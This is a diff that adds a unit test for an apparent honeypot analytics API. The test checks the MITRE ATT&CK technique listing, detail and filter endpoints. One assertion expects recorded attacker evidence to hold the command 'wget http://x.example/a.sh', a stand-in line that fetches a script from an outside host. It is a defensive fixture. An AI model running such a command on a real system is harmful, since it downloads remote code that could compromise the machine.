@@ -671,6 +671,42 @@ class TestAPI(unittest.TestCase):
         self.assertTrue(all(row["latitude"] is None and row["longitude"] is None
                             for row in unknown["sources"]))
 
+    def test_mitre_technique_listing_detail_and_filters(self):
+        response = self.client.get("/api/mitre/techniques")
+        self.assertEqual(response.status_code, 200)
+        data = response.json()
+        techniques = {row["technique_id"]: row for row in data["items"]}
+        self.assertTrue({"T1110.001", "T1059.004", "T1105"}.issubset(techniques))
+        self.assertEqual(data["summary"]["source_ips"], 2)
+        self.assertTrue(data["items"])
+        self.assertNotIn("sources", techniques["T1105"])
+
+        page = self.client.get("/api/mitre/techniques", params={"limit": 1}).json()
+        self.assertEqual(len(page["items"]), 1)
+        self.assertTrue(page["has_more"])
+        self.assertEqual(page["summary"]["mapped_techniques"], 3)
+
+        detail = self.client.get("/api/mitre/techniques/T1105")
+        self.assertEqual(detail.status_code, 200)
+        self.assertEqual(detail.json()["sources"][0]["src_ip"], "1.1.1.1")
+        self.assertEqual(detail.json()["sources"][0]["session_ids"], ["s1"])
+        self.assertIn("wget http://x.example/a.sh", detail.json()["sources"][0]["evidence_examples"])
+
+        filtered = self.client.get("/api/mitre/techniques", params={
+            "technique_id": "T1110.001", "source_ip": "2.2.2.2",
+            "start": "2026-01-01", "end": "2026-01-01", "behavior": BOT,
+        }).json()
+        self.assertEqual(filtered["total"], 1)
+        self.assertEqual(filtered["items"][0]["event_count"], 3)
+        self.assertEqual(filtered["summary"]["source_ips"], 1)
+
+        empty = self.client.get("/api/mitre/techniques", params={
+            "tactic": "Discovery", "source_ip": "9.9.9.9",
+        }).json()
+        self.assertEqual(empty["items"], [])
+        self.assertEqual(empty["summary"]["mapped_techniques"], 0)
+        self.assertEqual(self.client.get("/api/mitre/techniques/T9999").status_code, 404)
+
     def test_risk_level_counts_match_attackers(self):
         attackers = self.client.get(
             "/api/attackers",
